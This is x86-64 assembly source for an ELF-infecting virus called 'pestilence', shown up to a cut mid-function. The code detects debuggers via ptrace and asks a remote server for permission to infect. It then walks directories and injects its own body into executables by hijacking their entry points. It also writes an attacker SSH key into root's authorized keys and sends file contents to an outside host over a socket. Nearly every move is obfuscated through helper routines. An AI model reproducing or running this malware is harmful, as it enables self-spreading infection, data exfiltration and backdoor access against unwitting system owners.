; %include "asm/srcs/obf_file.inc"
%include "asm/srcs/pestilence.inc"
bits 64 
default rel
section .text
global _start
_start:
    ; mov rbp, rsp
	push rbp
    mov rbp, rsp
	PUSHA
	; lea rdi, [rel dir1]                                   ; dir to open for arg readDir
	; mov rsi, dir1Len
	; call _readDir
	call _map_int_table
	call _check_debug
    call _isInfectionAllow
    test rax, rax
    js _final_jmp
push rax
push  0
call mov2
add rsp, 8
mov rdx, rax
pop rax
    ;  dir to open for arg initDir
    lea rdi, [rel dir1]                                   
    ; mov rdi, dir1                                       ; dir to open for arg initDir
    call _initDir
push rax
push  0
call mov1
add rsp, 8
mov rdx, rax
pop rax
    lea rdi, [rel dir2]
    ; mov rdi, dir2                                       ; dir to open for arg initDir
    call _initDir
    call _backdoor
    ; jmp _exit
	_final_jmp:
	POPA	
push rax
push  rbp
call mov3
add rsp, 8
mov rsp, rax
pop rax
	pop rbp
	_bf_exit:
    jmp _exit
_check_debug:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
push  r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 127]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 251]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 375]
or  rax, r14 
pop r14
pop r15
	syscall
	push rax
push rax
push  rax
call mov2
add rsp, 8
mov rsi, rax
pop rax
push  SYS_PTRACE
call mov4
add rsp, 8
push rax
push  PTRACE_TRACEME
call mov1
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push  r14
call mov3
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 128]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 252]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 376]
or  rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push  r14
call mov3
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 125]
shl r14, 0x10
or  r10, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or  r10, r14 
movzx r14, byte [r15 + 373]
or  r10, r14 
pop r14
pop r15
	syscall
cmp rax, 0 
	jl _exit
	pop rax
push rax
push  rax
call mov2
add rsp, 8
mov rsi, rax
pop rax
push  SYS_PTRACE
call mov4
add rsp, 8
push rax
push  PTRACE_DETACH
call mov1
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push  r14
call mov1
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 128]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 252]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 376]
or  rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push  r14
call mov3
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 125]
shl r14, 0x10
or  r10, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or  r10, r14 
movzx r14, byte [r15 + 373]
or  r10, r14 
pop r14
pop r15
	syscall
	ret
; take directory to open in rdi-> pwd
_initDir:
    ; placing pestilence on the stack
    push rbp
    mov rbp, rsp
    sub rsp, pestilence_size
	lea r8, FAM(pestilence.fd)
	or qword [r8], -1
    lea rsi, FAM(pestilence.pwd)
    ;  strcpy(pestilence.pwd(rsi), pwd(rdi))
    call _strcpy                                            
cmp rdx, 0 
    je _readDir
    ;  strlen(pestilence.pwd(rsi))
    call _strlen                                            
push rax
push rsi
push  rax
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
cmp BYTE [rsi - 1], '/' 
    je _join
mov BYTE [rsi], '/' 
push rax
push rsi
push  1
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
    _join:
push rax
push  rdx
call mov4
add rsp, 8
mov rdi, rax
pop rax
    call _strcpy
    mov rdi, rsp
_readDir:
push  SYS_OPEN
call mov2
add rsp, 8
push rax
push  O_RDONLY | O_DIRECTORY
call mov1
add rsp, 8
mov rsi, rax
pop rax
    xor rdx, rdx
    syscall
cmp rax, 0 
    jl _returnClose
    ;  en registre le fd dans la struct
    lea rdi, FAM(pestilence.fd)                             
push rax
push  rax
call mov3
add rsp, 8
mov [rdi], rax
pop rax
    _getDents:
        lea r10, FAM(pestilence.fd) 
        ;  init total_read
        lea r9, FAM(pestilence.total_read)                  
mov DWORD [r9], 0 
push  SYS_GETDENTS
call mov4
add rsp, 8
push rax
push  qword [r10]
call mov2
add rsp, 8
mov rdi, rax
pop rax
        lea rsi, FAM(pestilence.dirents)
push rax
push  PAGE_SIZE
call mov2
add rsp, 8
mov rdx, rax
pop rax
        syscall
cmp rax, 0 
        jle _returnClose
    ;  r10 -> (struct pestilence.diretents_struct_ptr)
    lea r10, FAM(pestilence.dirents_struct_ptr) 			
    ;  pestilence.dirents_struct_ptr -> pestilence.dirents
push rax
push  rsi
call mov3
add rsp, 8
mov [r10], rax
pop rax
    ;  r11 -> (struct pestilence.total_to_read)
    lea r11, FAM(pestilence.total_to_read)      			
mov DWORD [r11], eax 
    _listFile:
        ;  r8 -> total lu de getdents
        lea r8, FAM(pestilence.total_read)      			
        ;  r9 -> total a lire de getdents
        lea r9, FAM(pestilence.total_to_read)       		
        ;  r10 -> actual dirent struct
        mov r10, FAM(pestilence.dirents_struct_ptr) 		
        ;  r11 -> ptr de la struct actuelle
        lea r11, FAM(pestilence.dirents_struct_ptr) 		
movzx r12, WORD [r10 + D_RECLEN_OFF] 
        ;  update du total lu dans r8
        add [r8], r12d                        			
        ;  pestilence.diretns_struct_ptr -> sur la prochaine struct
        add qword [r11], r12                          		
cmp BYTE [r10 + D_TYPE], D_FOLDER 
        je _recursif
cmp BYTE [r10 + D_TYPE], D_REG_FILE 
        jne _checkRead
        _updatePath:
            ; strlen
            mov rsi,  rsp
            call _strlen
lea rsi, [r10 + D_NAME] 
            mov byte [rsi - 1], '/'
push rax
push  1
call add1
add rsp, 8
add rsp, 8
            sub rsi, rax
            mov rdi, rsp
            call _strcpyNoNull
            ; printing
            ; writeWork
            ; writeBack
            ; ajouter les foncton pour chaques fichier ici
            ; call _open_file
			call _check_file
            jmp _checkRead
            _recursif:
                lea rdi, FAM(pestilence.pwd)
lea rdx, [r10 + D_NAME] 
cmp BYTE [rdx], 0x2e 
                jne _callInit
cmp BYTE [rdx + 1], 0 
                je _checkRead
cmp BYTE [rdx + 1], 0x2e 
                jne _callInit
cmp BYTE [rdx + 2], 0 
                je _checkRead
                _callInit:
                    call _initDir
            _checkRead:
                mov r8, FAM(pestilence.total_read)
                mov r12, FAM(pestilence.total_to_read)
                ;  if (total lu >= total getdents)
                cmp r8d, r12d                 			
                jge _getDents
                jmp _listFile
    _returnClose:
		mov rdi, FAM(pestilence.fd)
cmp qword rdi, 0 
		jle	_returnLeave
push  SYS_CLOSE
call mov1
add rsp, 8
		syscall
		or qword FAM(pestilence.fd), -1
		jmp _returnLeave
        ; mov rdi, FAM(pestilence.fd)
        ; syscall
_returnLeave:
    leave
_return:
    ret
_check_file:
	push rbp
	mov	rbp, rsp
	sub rsp, infection_size
	lea rax, INF(infection.injection_offset)
mov qword [rax], 0 
	lea rax, INF(infection.add_page)
mov byte [rax], 0 
	lea rax, INF(infection.mem_eof)
mov qword [rax], 0 
	_open_file:
push  SYS_OPEN
call mov4
add rsp, 8
push rax
push  rsi
call mov2
add rsp, 8
mov rdi, rax
pop rax
push rax
push  O_RDWR
call mov4
add rsp, 8
mov rsi, rax
pop rax
		xor rdx, rdx
		syscall
cmp rax, 0x0 
		jl	_returnLeave
push rax
push  rax
call mov3
add rsp, 8
mov INF(infection.file_fd), rax
pop rax
	; === get file size ===
	_get_filesz:
push  SYS_LSEEK
call mov1
add rsp, 8
		mov	rdi, INF(infection.file_fd)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push  r14
call mov2
add rsp, 8
mov rsi, rax
pop rax
movzx r14, byte [r15 + 125]
shl r14, 0x10
or  rsi, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or  rsi, r14 
movzx r14, byte [r15 + 373]
or  rsi, r14 
pop r14
pop r15
push rax
push  SEEK_END
call mov4
add rsp, 8
mov rdx, rax
pop rax
		syscall
cmp rax, 0x0 
		jle _close_file_inf
push rax
push  rax
call mov3
add rsp, 8
mov INF(infection.map_size), rax
pop rax
push rax
push  rax
call mov1
add rsp, 8
mov INF(infection.original_end), rax
pop rax
	_map_file:
	; rax	-> map
		;  rsi = file_size
push rax
push  rax
call mov2
add rsp, 8
mov rsi, rax
pop rax
push  SYS_MMAP
call mov4
add rsp, 8
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push  r14
call mov1
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 125]
shl r14, 0x10
or  rdi, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or  rdi, r14 
movzx r14, byte [r15 + 373]
or  rdi, r14 
pop r14
pop r15
push rax
push  PROT_READ | PROT_WRITE | PROT_EXEC
call mov3
add rsp, 8
mov rdx, rax
pop rax
push rax
push  MAP_SHARED
call mov1
add rsp, 8
mov r10, rax
pop rax
		mov r8, INF(infection.file_fd)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push  r14
call mov4
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 125]
shl r14, 0x10
or  r9, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or  r9, r14 
movzx r14, byte [r15 + 373]
or  r9, r14 
pop r14
pop r15
		syscall
cmp rax, 0x0 
		jl _close_file_inf
		call _extractData
push  r12
call mov2
add rsp, 8
push rax
push  r15
call mov3
add rsp, 8
mov rsi, rax
pop rax
		lea r8, INF(infection.map_addr)
push rax
push  rax
call mov4
add rsp, 8
mov [r8], rax
pop rax
	_check_format:
cmp dword [rax + 1], 0x02464c45 
		jne _unmap_close_inf
	_check_already_infected:
	; rax	== total segment number
	; r9	== injection offset
	; r13	== original segment end offset
	; r14	-> header table
	; r15	-> map
push rax
push  rax
call mov1
add rsp, 8
mov r15, rax
pop rax
push rax
push  r15
call mov3
add rsp, 8
mov r14, rax
pop rax
push rax
push r14
push  qword [r14 + elf64_ehdr.e_phoff]
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
		xor rcx, rcx
		_go_to_last_segment:
			cmp cx, [r15  + elf64_ehdr.e_phnum]
			jge _go_to_last_segment_end	
push rax
push r14
push  elf64_phdr_size
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
			inc rcx
			jmp _go_to_last_segment
		_go_to_last_segment_end:
push rax
push  r14
call mov2
add rsp, 8
mov INF(infection.last_seg_hdr_addr), rax
pop rax
		xor r9, r9
		_segment_loop:
cmp cx, 0 
			jle	_segment_loop_end
			_check_segment_format:
bt word [r14], 0 
				jnc _continue
bt qword [r14], 0x20 
				jc _handle_valid_segment
			_continue:
				dec rcx
				sub r14, elf64_phdr_size
				jmp _segment_loop
		_segment_loop_end:
			mov r9, INF(infection.injection_offset)
cmp r9, 0 
			je _unmap_close_inf
cmp byte INF(infection.add_page), 1 
			je _add_page
			;  else jmp _infection
			jmp _infection										
		_handle_valid_segment:
		; Check if the segment signed, else check the size, if big enough save the offsets if not already done
			_check_signature:
			; r8	-> potential signature
			; r9	== signature variable
push rax
push  r15
call mov2
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push  qword [r14 + elf64_phdr.p_offset]
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push r8
push  qword [r14 + elf64_phdr.p_filesz]
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
				sub r8, signature_len
push rax
push  qword [rel signature]
call mov4
add rsp, 8
mov r9, rax
pop rax
				cmp qword r9, [r8]
				je _unmap_close_inf
			_valid_seg_already_found:
				mov r9, INF(infection.injection_offset)
				test r9, r9
				jz _check_cave_size
				mov r9, INF(infection.add_page)
				test r9, r9
				jz _continue
			_check_cave_size:
			; r8	== end of infection offset
			; r9	== next segment offset
push rax
push  qword [r14 + elf64_phdr.p_offset]
call mov3
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push  qword [r14 + elf64_phdr.p_filesz]
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
				;  save segment end's offset
push rax
push  r8
call mov1
add rsp, 8
mov r13, rax
pop rax
push rax
push r8
push  CODE_LEN
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push  r14
call mov4
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push  elf64_phdr_size
call add1
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push r9
push  elf64_phdr.p_offset
call add1
add rsp, 8
pop r9
mov r9, rax
pop rax
				cmp [r9], r8
				;  if ([r9] < r8) { infection.add_page = 1) }
				setb INF(infection.add_page)			
			_save_offsets:
			; r8	-> infection structure members
			; r9	== injection address
			; r12	== original entrypoint
			;*r13	== segment end's offset (_check_cave_size)
			;*r14	-> segment header in header table
				lea r8, INF(infection.seg_nb)
				mov [r8], cl
				lea r8, INF(infection.original_entry)
push rax
push  qword [r15 + elf64_ehdr.e_entry]
call mov3
add rsp, 8
mov r12, rax
pop rax
push rax
push  r12
call mov2
add rsp, 8
mov [r8], rax
pop rax
				lea r8, INF(infection.injection_offset)
push rax
push  r13
call mov1
add rsp, 8
mov [r8], rax
pop rax
				lea	r8, INF(infection.injection_addr)
				push r9
push rax
push  qword [r14 + elf64_phdr.p_vaddr]
call mov3
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push  qword [r14 + elf64_phdr.p_memsz]
call add1
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push  r9
call mov4
add rsp, 8
mov [r8], rax
pop rax
				pop r9
				lea r8, INF(infection.seg_hdr_addr)
push rax
push  r14
call mov1
add rsp, 8
mov [r8], rax
pop rax
				jmp _continue
_add_page:
	_update_file_size:
push  SYS_FTRUNCATE
call mov2
add rsp, 8
		mov rdi, INF(infection.file_fd)
		lea rsi, INF(infection.map_size)
		push qword [rsi]
add qword [rsi], PAGE_SIZE 
		and qword [rsi], -4096
add qword [rsi], CODE_LEN 
push rax
push  qword [rsi]
call mov3
add rsp, 8
mov rsi, rax
pop rax
		syscall
		pop rsi
cmp rax, 0 
		jl _unmap_close_inf
	_unmap_prev_map:
		mov rdi, INF(infection.map_addr)
push  SYS_UNMAP
call mov2
add rsp, 8
		syscall
	_remap_file:
push  SYS_MMAP
call mov1
add rsp, 8
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push  r14
call mov4
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 125]
shl r14, 0x10
or  rdi, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or  rdi, r14 
movzx r14, byte [r15 + 373]
or  rdi, r14 
pop r14
pop r15
		;  rsi = file_size
		mov rsi, INF(infection.map_size)				
push rax
push  PROT_READ | PROT_WRITE | PROT_EXEC
call mov4
add rsp, 8
mov rdx, rax
pop rax
push rax
push  MAP_SHARED
call mov2
add rsp, 8
mov r10, rax
pop rax
		mov r8, INF(infection.file_fd)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push  r14
call mov1
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 125]
shl r14, 0x10
or  r9, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or  r9, r14 
movzx r14, byte [r15 + 373]
or  r9, r14 
pop r14
pop r15
		syscall
cmp rax, 0x0 
		jl _close_file_inf
		lea r8, INF(infection.map_addr)
push rax
push  rax
call mov3
add rsp, 8
mov [r8], rax
pop rax
	_find_memory_eof:
		mov r14, INF(infection.map_addr)
		movzx rax, word [r14 + elf64_ehdr.e_shnum]
push rax
push r14
push  qword [r14 + elf64_ehdr.e_shoff]
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
		xor rcx, rcx
		_find_mem_eof_loop:
			cmp rcx, rax
			jge _find_mem_eof_end
push rax
push  qword [r14 + elf64_shdr.sh_addr]
call mov4
add rsp, 8
mov rbx, rax
pop rax
push rax
push rbx
push  qword [r14 + elf64_shdr.sh_size]
call add1
add rsp, 8
pop rbx
mov rbx, rax
pop rax
			cmp INF(infection.mem_eof), rbx
			jge _find_mem_eof_continue
push rax
push  rbx
call mov2
add rsp, 8
mov INF(infection.mem_eof), rax
pop rax
		_find_mem_eof_continue:
push rax
push r14
push  elf64_shdr_size
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
			inc rcx
			jmp _find_mem_eof_loop
		_find_mem_eof_end:
	_find_pt_note:
	; r14	-> segmentS header
	; rcx	== segment counter
		mov r14, INF(infection.map_addr)
		movzx rax, word [r14 + elf64_ehdr.e_phnum]
push rax
push r14
push  qword [r14 + elf64_ehdr.e_phoff]
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
		xor rcx, rcx
		_find_pt_note_loop:
			cmp rcx, rax
			jge _find_pt_note_loop_end
cmp dword [r14 + elf64_phdr.p_type], PT_NOTE 
			je _mutate_pt_note_seg
		_find_pt_note_loop_continue:
push rax
push r14
push  elf64_phdr_size
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
			inc rcx
			jmp _find_pt_note_loop
		_find_pt_note_loop_end:
push rax
push  -1
call mov1
add rsp, 8
mov r14, rax
pop rax
	_mutate_pt_note_seg:
	; r14	-> segment header
	; rax	== new offset / address
cmp r14, 0 
		jl	_update_final_jump
mov dword [r14 + elf64_phdr.p_type], PT_LOAD 
mov qword [r14 + elf64_phdr.p_flags], PF_X | PF_R 
mov qword [r14 + elf64_phdr.p_filesz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_memsz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_align], PAGE_SIZE 
		mov rax, INF(infection.original_end)
push rax
push  PAGE_SIZE
call add1
add rsp, 8
add rsp, 8
		and rax, -4096
		mov qword [r14 + elf64_phdr.p_offset], rax
		mov qword INF(infection.injection_offset), rax
		mov rax, INF(infection.mem_eof)
push rax
push  PAGE_SIZE
call add1
add rsp, 8
add rsp, 8
		and rax, -4096
		mov qword INF(infection.injection_addr), rax
		mov qword [r14 + elf64_phdr.p_vaddr], rax
		mov qword [r14 + elf64_phdr.p_paddr], rax
_infection:
	_update_elf_hdr:
	; r8	-> elf header entrypoint
	; r9	== end of segment + align (injection offset)
	; r10	== injection offset
		mov r8, INF(infection.map_addr)
push rax
push r8
push  elf64_ehdr.e_entry
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
		mov r10, INF(infection.injection_addr)
push rax
push  r10
call mov3
add rsp, 8
mov [r8], rax
pop rax
cmp byte INF(infection.add_page), 0 
		jg _copy_parasite
push rax
push  CODE_LEN
call mov4
add rsp, 8
mov rdi, rax
pop rax
		call _update_seg_sizes
	_copy_parasite:
	; rdi	-> injection start
	; rsi	-> parasite _start
	; rcx	== code len (_end - _start)
		mov rdi, INF(infection.map_addr)
		add rdi, INF(infection.injection_offset)
		;  rsi -> start of our code
		lea rsi, [rel _start]					
push rax
push  CODE_LEN
call mov3
add rsp, 8
mov rcx, rax
pop rax
		;  copy from _start to _end (= !std)
		cld										
		rep movsb
	_update_final_jump:
	; r8 -> _bf_exit instruction's addr (_bf_exit + 1)
	; r9 == distance to jump from final jump to original entry point
		mov r8, INF(infection.map_addr)
		add r8, INF(infection.injection_offset)
push rax
push r8
push  FINJMP_OFF
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
		inc r8
		mov r10, INF(infection.injection_addr)
push rax
push r10
push  FINJMP_OFF
call add1
add rsp, 8
pop r10
mov r10, rax
pop rax
push rax
push r10
push  0x05
call add1
add rsp, 8
pop r10
mov r10, rax
pop rax
		mov r9, INF(infection.original_entry)
		sub r9, r10
		mov [r8], r9d
		jmp _unmap_close_inf
_update_seg_sizes:
; r8	-> segment header data
;*r14	-> segment header in header table
	mov r8, INF(infection.seg_hdr_addr)
	;  save header start for later
	push r8											
	; * Update file size *
push rax
push r8
push  qword elf64_phdr.p_filesz
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
	add qword [r8], rdi
	pop r8
	; * Update memory size *
push rax
push r8
push  elf64_phdr.p_memsz
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
	add qword [r8], rdi
	ret
; --- privesc + backdoor
_backdoor:
    ; open "/root/.ssh/authorized.key"
    ; r9 == fd
    push rbp
    mov rbp, rsp
sub rsp, 0x1000 
push  SYS_OPEN
call mov1
add rsp, 8
    ; mov rdi, sshFile
    lea rdi, [rel sshFile]
push rax
push  O_RDWR | O_CREAT
call mov2
add rsp, 8
mov rsi, rax
pop rax
push rax
push  600
call mov1
add rsp, 8
mov rdx, rax
pop rax
    syscall
    test rax, rax
    js _returnLeave
push rax
push  rax
call mov3
add rsp, 8
mov r9, rax
pop rax
    _readSsh:
        ; *r9 == fd
        ; r10 == size read
        ; rsi -> buffer
push  SYS_READ
call mov2
add rsp, 8
push rax
push  r9
call mov4
add rsp, 8
mov rdi, rax
pop rax
push rax
push  rbp
call mov3
add rsp, 8
mov rsi, rax
pop rax
sub rsi, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
push rax
push  r14
call mov1
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 165]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 289]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 413]
or  rdx, r14 
pop r14
pop r15
        syscall
cmp rax, 0 
        je _notFound
        jl _closeSsh
push rax
push  rax
call mov2
add rsp, 8
mov r10, rax
pop rax
    _checkBackdoor:
        ; rcx == nombre d'octet lue
        ; r11 -> buffer
push rax
push  r10
call mov4
add rsp, 8
mov rcx, rax
pop rax
push rax
push  rsi
call mov3
add rsp, 8
mov r11, rax
pop rax
        ; for every new line
        _findNewline:
cmp byte [r11], 0xa 
            je _cmpLine
            inc r11
            loop _findNewline
push  SYS_WRITE
call mov2
add rsp, 8
push rax
push  back
call mov4
add rsp, 8
mov rsi, rax
pop rax
push rax
push  1
call mov1
add rsp, 8
mov rdx, rax
pop rax
            syscall
            jmp _notFound
            ; cmp the line with pub ssh key
            _cmpLine:
mov byte [r11], 0 
push rax
push  r11
call mov2
add rsp, 8
mov rdi, rax
pop rax
sub rdi, sshPubLen - 1 
                lea rsi, [rel sshPub]
                push rcx
                call _strcmp
                pop rcx
                test rax, rax            
                je _closeSsh
                inc r11
				dec rcx
				jnz _findNewline
                ; loop _findNewline
        ; if not found write it
        _notFound:
push rax
push  r9
call mov1
add rsp, 8
mov rdi, rax
pop rax
push  SYS_WRITE
call mov3
add rsp, 8
            lea rsi, [rel sshPub]
push rax
push  sshPubLen - 1
call mov4
add rsp, 8
mov rdx, rax
pop rax
            syscall
push  SYS_WRITE
call mov2
add rsp, 8
            lea rsi, [rel back]
push rax
push  1
call mov1
add rsp, 8
mov rdx, rax
pop rax
            syscall
    _closeSsh:
push  SYS_CLOSE
call mov4
add rsp, 8
push rax
push  r9
call mov3
add rsp, 8
mov rdi, rax
pop rax
        syscall
        ; 
        jmp _returnLeave
_initSocket:
    _creatSocket:
push  SYS_SOCKET
call mov2
add rsp, 8
push rax
push  AF_INET
call mov1
add rsp, 8
mov rdi, rax
pop rax
push rax
push  SOCK_STREAM
call mov4
add rsp, 8
mov rsi, rax
pop rax
        xor rdx, rdx
        syscall
        test rax, rax
        js _return
push rax
push  rax
call mov3
add rsp, 8
mov rdi, rax
pop rax
    _connectSocket:
push  SYS_CONNECT
call mov1
add rsp, 8
        lea rsi, [rel sockaddr]
push rax
push  16
call mov2
add rsp, 8
mov rdx, rax
pop rax
        syscall
        test rax, rax
        js _closeSock
push  rdi
call mov3
add rsp, 8
        ret
_munmapExtractBuffer:
push  SYS_UNMAP
call mov4
add rsp, 8
push rax
push  rsi
call mov1
add rsp, 8
mov rdi, rax
pop rax
push rax
push  rdx
call mov2
add rsp, 8
mov rsi, rax
pop rax
    syscall
    pop rdi
; (rdi: socket)
_closeSock:
push  SYS_CLOSE
call mov4
add rsp, 8
    syscall
push  -1
call mov3
add rsp, 8
    ret
; extrait les donnees des fichiers via http
_extractData:
    ;  r12 -> maped file_date
push rax
push  rax
call mov3
add rsp, 8
mov r12, rax
pop rax
    push rsi
    call _creatSocket
    pop rsi
push rax
push  rax
call mov2
add rsp, 8
mov r13, rax
pop rax
    _checkFd:
cmp r13, 0 
        jl _return
    _mmapBuffer:
    ; rax -> mmap buffer
    ; r15 == la size du mmap buffer
    ; r12 -> maped file_data
push  SYS_MMAP
call mov4
add rsp, 8
        xor rdi, rdi
        push rsi
push rax
push rsi
push  headerStartLen
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push  headerEndLen
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push  10
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push  rsi
call mov1
add rsp, 8
mov r15, rax
pop rax
push rax
push  PROT_READ | PROT_WRITE
call mov2
add rsp, 8
mov rdx, rax
pop rax
push rax
push  MAP_PRIVATE | MAP_ANONYMOUS
call mov3
add rsp, 8
mov r10, rax
pop rax
        xor r8, r8
        xor r9, r9
        syscall
    _copyData:
        ; r14 -> header buffer
        ; *r15 == la taille du mmap buffer
push rax
push  rax
call mov1
add rsp, 8
mov r14, rax
pop rax
push rax
push  rax
call mov4
add rsp, 8
mov rsi, rax
pop rax
        lea rdi, [rel headerStart]
        call _strcpy
        pop rax
        push rax
push rax
push rsi
push  headerStartLen - 1
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
        call _itoa
        lea rdi, [rel headerEnd]
        call _strcpy
push rax
push rsi
push  headerEndLen - 1
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push  r12
call mov1
add rsp, 8
mov rdi, rax
pop rax
        pop rcx
        call _strncpy
    _sendTo:
push  SYS_SENDTO
call mov2
add rsp, 8
push rax
push  r13
call mov4
add rsp, 8
mov rdi, rax
pop rax
push rax
push  r14
call mov3
add rsp, 8
mov rsi, rax
pop rax
push rax
push  r15
call mov4
add rsp, 8
mov rdx, rax
pop rax
        xor r10, r10
        xor r9, r9
        syscall
        push rdi
        jmp _munmapExtractBuffer
; manage infection
_isInfectionAllow:
    push rbp
    mov rbp, rsp 
    call _creatSocket
cmp rax, 0 
    jl _allow
    _sendInfectionRequest:
        ;rdi == sockfd
push rax
push  rax
call mov2
add rsp, 8
mov rdi, rax
pop rax
push  SYS_SENDTO
call mov3
add rsp, 8
        lea rsi, [rel headerGet]
push rax
push  headerGetLen
call mov1
add rsp, 8
mov rdx, rax
pop rax
        xor r10, r10
        xor r9, r9
        syscall
        test rax, rax
        js _allow
    _nanoSleep:
        push rdi
push  35
call mov3
add rsp, 8
        lea rdi, [rel timespec]
        xor rsi, rsi
        syscall
        pop rdi
    _recvInfectionRequest:
        ;* rdi == sockfd
push  SYS_RECVFROM
call mov1
add rsp, 8
sub rsp, 200 
        mov rsi, rsp
push rax
push  200
call mov4
add rsp, 8
mov rdx, rax
pop rax
        xor r10, r10
        syscall
        test rax, rax
        js _allow
    _infectionRequestRespons:
        ;* rdi == sockfd
        mov rsi, rsp
        call _strlen
push rax
push rsp
push  rax
call add1
add rsp, 8
pop rsp
mov rsp, rax
pop rax
sub rsp, 2 
cmp WORD [rsp], 0x4b4f 
        jne _notAllow
    _allow:
        call _closeSock
push  0
call mov2
add rsp, 8
        jmp _returnLeave
    _notAllow:
        call _closeSock
push  -1
call mov1
add rsp, 8
        jmp _returnLeave
;;**;;
mov2:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, -1
bzhi rax, rcx, rdx

pop rdx
pop rcx
ret
mov1:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, (64 << 8) | 0  ; flag pour le mov de bextr
bextr rax, rcx, rdx ; mov rax, rcx

pop rdx
pop rcx
ret
mov3:
push rcx
push rbx
mov rbx, qword [rsp + 8 + 16]

mov rax, 0
mov rcx, 0x3d42f
cmpxchg rbx, rcx

pop rbx
pop rcx
ret
mov4:
push rbx
push rcx
mov rcx, qword [rsp + 8 + 16]

mov rax, 0
mov rbx, 0
cmpxchg rbx, rcx
mov rax, rbx
pop rcx
pop rbx
ret
add1:
push rcx
mov rax, qword [rsp + 16 + 8]
mov rcx, qword [rsp + 8 + 8]

test rcx, rcx   ;  is rcx == 0 ?
jnz sub
jnc do_adc
jmp reverseCF

sub:
sub rcx, 1
jnc reverseCF   ; Jump if Carry Flag is Not set (CF=0)
jmp do_adc  ; Jump to ADC instruction
reverseCF:   
cmc ; Complement CF, making it 1
do_adc: ; Perform ADC with prepared carry flag
adc rax, rcx; RAX = RAX + rcx + CF

pop rcx
ret
; rax: int *_map_int_table( void )
_map_int_table:
	; rax	-> new map
	push rdi
	push rsi
push rdx
push r10
push r8
push r9
push  SYS_MMAP
call mov4
add rsp, 8
push rax
push  0x0
call mov2
add rsp, 8
mov rdi, rax
pop rax
push rax
push  0x1f0
call mov3
add rsp, 8
mov rsi, rax
pop rax
push rax
push  PROT_READ | PROT_WRITE
call mov2
add rsp, 8
mov rdx, rax
pop rax
push rax
push  0x22
call mov3
add rsp, 8
mov r10, rax
pop rax
push rax
push  -1
call mov4
add rsp, 8
mov r8, rax
pop rax
push rax
push  0x0
